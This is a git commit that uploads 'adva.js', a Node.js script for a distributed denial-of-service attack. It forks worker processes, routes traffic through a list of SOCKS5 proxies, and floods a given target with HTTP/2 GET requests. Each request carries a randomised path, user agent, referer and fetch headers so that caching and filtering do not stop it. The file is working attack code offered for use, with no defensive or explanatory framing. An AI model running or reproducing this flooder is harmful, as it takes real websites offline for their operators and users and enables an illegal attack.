91e10b634c7e4e597d8c5f7d0b51e4b191811b45
wannatermux <80704106+wannatermux@users.noreply.github.com>
2025-12-23 18:08:53 +0500

    Add files via upload

---
+++ adva.js
@@ -0,0 +1,222 @@
+const net = require("net");
+const http2 = require("http2");
+const tls = require("tls");
+const cluster = require("cluster");
+const url = require("url");
+const fs = require("fs");
+const { SocksClient } = require("socks");
+
+process.setMaxListeners(0);
+require("events").EventEmitter.defaultMaxListeners = 0;
+process.on('uncaughtException', function (exception) {});
+
+if (process.argv.length < 7){
+    console.log(`node socks.js target time rate thread proxyfile`);
+    process.exit();
+}
+
+function readLines(filePath) {
+    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
+}
+
+function randomIntn(min, max) {
+    return Math.floor(Math.random() * (max - min) + min);
+}
+
+function randomElement(elements) {
+    return elements[randomIntn(0, elements.length)];
+}
+
+function randomString(length) {
+    let result = '';
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    for (let i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * characters.length));
+    }
+    return result;
+}
+
+const args = {
+    target: process.argv[2],
+    time: ~~process.argv[3],
+    Rate: ~~process.argv[4],
+    threads: ~~process.argv[5],
+    proxyFile: process.argv[6]
+};
+
+var proxies = readLines(args.proxyFile);
+const parsedTarget = url.parse(args.target);
+
+if (cluster.isMaster) {
+    for (let counter = 1; counter <= args.threads; counter++) {
+        cluster.fork();
+    }
+} else {
+    setInterval(runFlooder, 0);
+}
+
+class NetSocket {
+    constructor(){}
+
+    SOCKS5(options, callback) {
+        const proxyParts = options.proxy.replace('socks5://', '').split(':');
+        const socksOptions = {
+            proxy: {
+                host: proxyParts[0],
+                port: parseInt(proxyParts[1]),
+                type: 5
+            },
+            command: 'connect',
+            destination: {
+                host: options.address.split(':')[0],
+                port: 443
+            },
+            timeout: options.timeout
+        };
+
+        SocksClient.createConnection(socksOptions, (err, info) => {
+            if (err) {
+                return callback(undefined, "error: " + err);
+            }
+            const connection = info.socket;
+            connection.setKeepAlive(true, 60000);
+            return callback(connection, undefined);
+        });
+    }
+}
+
+const fetch_site = ["same-origin", "same-site", "cross-site"];
+const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
+const fetch_dest = ["document", "sharedworker", "worker"];
+
+const languages = [
+    "en-US,en;q=0.9",
+    "en-GB,en;q=0.8",
+    "es-ES,es;q=0.9",
+    "fr-FR,fr;q=0.9,en;q=0.8",
+    "de-DE,de;q=0.9,en;q=0.8",
+    "zh-CN,zh;q=0.9,en;q=0.8",
+    "ja-JP,ja;q=0.9,en;q=0.8"
+];
+
+const firefoxUseragents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:132.0) Gecko/20100101 Firefox/132.0",
+    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0", 
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:133.0) Gecko/20100101 Firefox/133.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.6; rv:132.0) Gecko/20100101 Firefox/132.0",
+    "Mozilla/5.0 (Macintosh; Apple Silicon Mac OS X 14.0; rv:133.0) Gecko/20100101 Firefox/133.0",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
+];
+const referers = [
+    "https://www.google.com/",
+    "https://www.bing.com/",
+    "https://duckduckgo.com/",
+    "https://www.yahoo.com/",
+    "https://www.baidu.com/",
+    parsedTarget.href
+];
+
+const Header = new NetSocket();
+
+function buildHeaders() {
+    const rand_query = "?" + randomString(12) + "=" + randomIntn(100000, 999999);
+    const rand_path = (parsedTarget.path || "/") + rand_query;
+
+    const headers = {
+        ":method": "GET",
+        ":path": rand_path,
+        ":authority": parsedTarget.host,
+        ":scheme": "https",
+        "user-agent": randomElement(firefoxUseragents),
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+        "accept-language": randomElement(languages),
+        "accept-encoding": "gzip, deflate, brz zstd",
+        "referer": randomElement(referers),
+        "upgrade-insecure-requests": "1",
+        "sec-fetch-dest": randomElement(fetch_dest),
+        "sec-fetch-mode": randomElement(fetch_mode),
+        "sec-fetch-site": randomElement(fetch_site)
+    };
+    if (Math.random() > 0.5) {
+        headers["dnt"] = "1";
+    }
+    if (Math.random() > 0.5) {
+        headers["sec-fetch-user"] = "?1";
+    }
+    if (Math.random() > 0.5) {
+        headers["te"] = "trailers";
+    }
+    return headers;
+}
+
+function runFlooder() {
+    const proxyAddr = randomElement(proxies);
+    if (!proxyAddr || !proxyAddr.includes(":")) return;
+
+    const proxyOptions = {
+        proxy: proxyAddr,
+        address: parsedTarget.host + ":443",
+        timeout: 500000
+    };
+
+    Header.SOCKS5(proxyOptions, (connection, error) => {
+        if (error) return;
+
+        connection.setKeepAlive(true, 60000);
+
+        const tlsOptions = {
+            ALPNProtocols: ['h2'],
+            rejectUnauthorized: false,
+            socket: connection,
+            servername: parsedTarget.host,
+            ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305",
+            sigalgs: "ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512",
+            curves: "X25519:P-256:P-384",
+            ecdhCurve: "X25519:P-256:P-384",
+            minVersion: "TLSv1.2",
+            maxVersion: "TLSv1.3"
+        };
+
+        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
+        tlsConn.setKeepAlive(true, 60000);
+
+        const client = http2.connect(parsedTarget.href, {
+            protocol: "https:",
+            settings: {
+                maxConcurrentStreams: 30,
+                initialWindowSize: 65535,
+                enablePush: false,
+            },
+            maxSessionMemory: 32000,
+            maxDeflateDynamicTableSize: 4294967295,
+            createConnection: () => tlsConn,
+            socket: connection,
+        });
+
+        client.on("connect", () => {
+            setInterval(() => {
+                for (let i = 0; i < args.Rate; i++) {
+                    const headers = buildHeaders();
+                    const request = client.request(headers);
+                    request.on("response", () => {
+                        request.close();
+                        request.destroy();
+                        return
+                    });
+                    request.end();
+                }
+            }, 1000);
+        });
+        client.on("close", () => {
+            client.destroy();
+            connection.destroy();
+        });
+    });
+}
+
+const KillScript = () => process.exit(1);
+setTimeout(KillScript, args.time * 1000);
